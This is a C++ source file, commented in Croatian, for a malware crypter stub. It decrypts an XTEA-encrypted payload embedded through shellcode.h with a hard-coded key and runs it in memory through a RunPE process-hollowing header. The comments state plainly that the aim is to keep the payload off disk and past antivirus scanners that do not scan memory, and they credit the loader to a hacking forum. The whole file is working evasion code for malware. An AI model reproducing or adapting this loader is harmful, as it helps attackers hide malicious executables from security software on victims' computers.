/* Kompajliranjem ovoga programa sa uključenom datotekom shellcode.h u kojoj 
 * se nalazi kriptirana datoteka stvara se datoteka dat.EXE koja nakon 
 * pokretanja dekriptira datoteku (koja je bila spremljenu u shellcode.h)
 * te je pokrenuti u memoriji (dekriptirana datoteka neće se naći na hard 
 * disku te će je detektirati jedino antivirusni softver koji skenira radnu 
 * memoriju (opcija AV softvera koja je radno intenzivna za računalo te se 
 * zbog toga ne koristi na običnim računalima klijenata).
 *
 * runPE.h je zaglavlje koje sadrži metodu za pokretanje programa u memoriji
 * 
 * Autor zaglavlja runPE.h nije poznat, zaglavlje se može pronaći na 
 * hackforums.net i drugim sličnim forumima/web mjestima.
 * 
 * Izvorni kod datoteka runPE.h, generatora shellcode-a te jednostavni
 * primjer koda koji poziva runPE.h metodu run preuzeti su sa:
 * http://www.mediafire.com/?qrjxfcqcdvmqo38
 */

#include <Windows.h>
#include "runPE.h"
#include "shellcode.h"
#include <stdint.h>

unsigned int kljuc[4]={0xACB5,0x1344,0xEC90,0x285C};

#define BLOCK_SIZE 8

void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const kljuc[4]){
     unsigned int i;
     uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
     for (i=0; i < num_rounds; i++){
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + kljuc[(sum>>11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + kljuc[sum & 3]);
     }
     v[0]=v0; v[1]=v1;
}

int main(){  
    unsigned char shellcode_decrypted[size];
    
    int n_blocks=size/BLOCK_SIZE;
    if(size%BLOCK_SIZE!=0)
        ++n_blocks;
      
    unsigned char data[BLOCK_SIZE];
    
    for(int i=0;i<n_blocks;i++){
        memcpy ( &data, &shellcode[i*BLOCK_SIZE], BLOCK_SIZE );
        decipher(32,(uint32_t*)data,kljuc);
        
        for(int j=0;j<BLOCK_SIZE;j++)
            memcpy ( &shellcode_decrypted[(i*BLOCK_SIZE)+j],&data[j], sizeof(unsigned char));
          
        memset(data,0,BLOCK_SIZE);
      }
      
  runPE rp;
    
	TCHAR szFilePath[1024];
	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
	
	rp.run(LPSTR(szFilePath), shellcode_decrypted);
	return 0;
}
